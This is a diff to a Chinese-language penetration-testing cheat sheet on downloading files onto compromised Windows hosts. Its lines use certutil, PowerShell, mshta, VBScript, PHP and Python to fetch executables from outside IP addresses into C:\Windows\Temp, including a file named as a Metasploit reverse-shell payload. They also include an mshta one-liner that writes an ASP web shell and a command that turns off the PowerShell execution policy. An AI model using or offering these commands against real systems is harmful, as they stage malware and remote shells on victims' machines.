@@ -36,6 +36,10 @@ certutil -urlcache -f http://114.115.123.123/a.exe
 ```
 
 ### 0x02 powershell下载文件
+有的时候PowerShell的执行权限会被关闭，需要使用如下的语句打开。
+
+C:\>powershell set-executionpolicy unrestricted
+
 ```bash
 powershell (new-object System.Net.WebClient).DownloadFile("http://114.115.123.123/a.exe","C:\Windows\Temp\a.exe")
 
@@ -81,8 +85,48 @@ demo
 mshta vbscript:createobject("scripting.filesystemobject").createtextfile("a.asp",2,ture).writeline("<%execute(request('l'))%>")(window.close)
 ```
 
+### 0x04 Visual Basic
+```
+Set args = Wscript.Arguments
+Url = "http://114.115.123.123/wyb/msf_reverse_tcp_x86.exe"
+dim xHttp: Set xHttp = createobject("Msxml2.ServerXMLHTTP.3.0")
+dim bStrm: Set bStrm = createobject("Adodb.Stream")
+xHttp.Open "GET", Url, False
+xHttp.Send
+with bStrm
+    .type = 1 '
+    .open
+    .write xHttp.responseBody
+    .savetofile "C:\Windows\Temp\aa.exe", 2 '
+end with
+```
+C:\Users\Administrator\Desktop> cscript test.vbs
+
+### 0x05 利用脚本语言
+* PHP
+
+```
+#!/usr/bin/php
+<?php
+    $data = file_get_contents("http://114.115.183.86/wyb/msf_reverse_tcp_x86.exe");
+    file_put_contents('C:\\Windows\\Temp\\aa.exe',$data);
+?>
+```
+C:\Users\Administrator\Desktop> php aa.php
+
+* Python
+
+```
+import urllib2;u = urllib2.urlopen('http://114.115.183.86/wyb/msf_reverse_tcp_x86.exe');f = open('C:\\Windows\\Temp\\aa.exe', 'w');f.write(u.read());f.close();
+```
+C:\Users\Administrator\Desktop> python aa.py
+
+### 0x06 FTP
+远程连接自己的ftp服务器，然后下载文件
+
 <br />
 #### Reference(侵删)：
 * [https://xianzhi.aliyun.com/forum/topic/1654](https://xianzhi.aliyun.com/forum/topic/1654?_blank)
 * [https://evi1cg.me/archives/Tricks.html](https://evi1cg.me/archives/Tricks.html?_blank)
 * [https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/](https://3gstudent.github.io/3gstudent.github.io/渗透测试中的certutil.exe/?_blank)
+* [http://www.secange.com/2017/08/收集整理的16种文件下载的方式/](http://www.secange.com/2017/08/收集整理的16种文件下载的方式/?_blank)
